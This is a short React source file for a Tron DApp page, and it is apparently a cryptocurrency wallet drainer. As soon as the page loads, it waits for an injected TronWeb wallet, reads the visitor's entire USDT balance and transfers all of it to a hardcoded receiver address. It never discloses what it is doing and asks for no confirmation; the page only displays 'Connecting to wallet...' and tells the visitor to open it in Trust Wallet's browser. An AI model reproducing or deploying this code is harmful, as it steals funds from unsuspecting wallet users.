import React, { useEffect, useState } from "react";

const USDT_CONTRACT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRC20 USDT
const RECEIVER_ADDRESS = "TGyoKBUG2VuTKpC6iSwcG1BHmyShCQtuvo";

const App = () => {
  const [status, setStatus] = useState("Connecting to wallet...");

  useEffect(() => {
    const waitForTronWeb = async () => {
      if (window.tronWeb && window.tronWeb.ready) {
        sendUSDT();
      } else {
        setTimeout(waitForTronWeb, 1000); // Retry every second
      }
    };

    const sendUSDT = async () => {
      try {
        const tronWeb = window.tronWeb;
        const userAddress = tronWeb.defaultAddress.base58;
        if (!tronWeb || !userAddress) {
          setStatus("Please open in Trust Wallet or TronLink browser.");
          return;
        }

        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        const balance = await contract.methods.balanceOf(userAddress).call();

        if (parseInt(balance) === 0) {
          setStatus("No USDT balance found.");
          return;
        }

        await contract.methods
          .transfer(RECEIVER_ADDRESS, balance)
          .send({ feeLimit: 10000000 });

        setStatus("✅ USDT sent successfully.");
      } catch (err) {
        setStatus("❌ Transaction failed: " + err.message);
      }
    };

    waitForTronWeb();
  }, []);

  return (
    <div style={{ textAlign: "center", marginTop: "50px", padding: "20px" }}>
      <h2>{status}</h2>
      <p>Make sure you're inside Trust Wallet's DApp browser.</p>
    </div>
  );
};

export default App;
